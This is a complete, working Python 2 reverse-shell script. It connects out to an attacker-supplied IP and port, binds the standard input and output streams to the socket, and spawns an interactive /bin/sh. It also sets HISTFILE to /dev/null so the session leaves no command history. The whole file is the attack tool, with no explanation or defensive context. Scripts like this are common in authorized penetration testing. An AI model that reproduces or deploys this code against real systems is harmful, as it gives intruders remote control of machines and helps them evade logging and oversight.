#!/usr/bin/python


import os
import pty
import socket
import sys


def main(lhost, lport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.putenv("HISTFILE", '/dev/null')
    pty.spawn("/bin/sh")
    s.close()


if __name__ == "__main__":
    try:
        host = sys.argv[1]
        port = int(sys.argv[2])
    except IndexError:
        print "Usage:", sys.argv[0], "<ip> <port>"
        sys.exit(1)
    try:
        main(host, port)
    except KeyboardInterrupt:
        print 'Interrupted'
        sys.exit(0)
